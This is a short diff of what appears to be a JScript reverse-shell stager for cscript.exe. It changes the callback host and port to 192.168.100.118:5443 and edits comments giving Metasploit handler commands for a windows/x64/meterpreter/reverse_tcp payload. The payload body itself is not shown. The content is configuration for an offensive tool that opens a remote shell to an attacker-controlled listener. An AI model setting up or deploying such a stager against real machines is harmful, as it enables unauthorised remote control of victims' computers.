@@ -17,16 +17,15 @@ Usage:
 Change RHOST and RPORT to suit your needs:
 */
 
-var RHOST = "172.16.97.1";
-var RPORT = "443";
+var RHOST = "192.168.100.118";
+var RPORT = "5443";
 
 /*
 Start Msfconsole:
 use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter/reverse_tcp <- When run from x64 version of cscript.exe
-set PAYLOAD windows/meterpreter/reverse_tcp <- When run from x86 version of cscript.exe
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
-set LPORT 443
+set LPORT 5443
 set EnableUnicodeEncoding true
 set EnableStageEncoding true
 set ExitOnSession false
